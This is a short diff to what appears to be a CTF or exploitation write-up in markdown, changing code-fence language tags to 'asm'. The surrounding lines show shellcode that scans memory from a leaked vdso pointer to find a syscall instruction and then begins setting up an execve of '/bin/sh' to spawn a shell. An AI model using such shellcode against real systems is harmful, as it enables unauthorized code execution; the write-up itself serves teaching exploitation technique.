@@ -113,7 +113,7 @@ mov r8, [rbp - 0x218]
 
 Now let's scan the memory area:
 
-```
+```asm
 loop:
 inc r8
 mov ax, word ptr [r8]
@@ -123,7 +123,7 @@ jne loop
 
 This code snipped increases r8 (pointer to vdso leak) and take two bytes, it then check if bytes are equal to the one representing a syscall and if not it loops. If it exits the loop, r8 will point to a valid syscall instruction, and we can continue with setting the registers for a execve call.
 
-```
+```asm
 mov r9, {u64(b"/bin/sh\0")}
 push r9
 
